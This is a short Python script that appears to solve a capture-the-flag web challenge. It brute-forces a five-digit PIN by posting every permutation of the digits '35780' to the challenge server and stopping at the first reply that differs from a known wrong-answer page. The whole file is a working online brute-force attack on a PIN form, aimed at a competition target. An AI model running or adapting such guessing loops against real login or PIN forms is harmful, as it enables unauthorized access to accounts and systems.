import requests
from itertools import permutations


url = 'https://old-lock-web.2021.ctfcompetition.com/'

incorrect_text = requests.post(url, {'v': 12345}).text

pincode_characters = '35780'

for i in permutations('35780', 5):
    pincode = int(''.join(i))
    if requests.post(url, {'v': pincode}).text != incorrect_text:
        print(pincode)
        break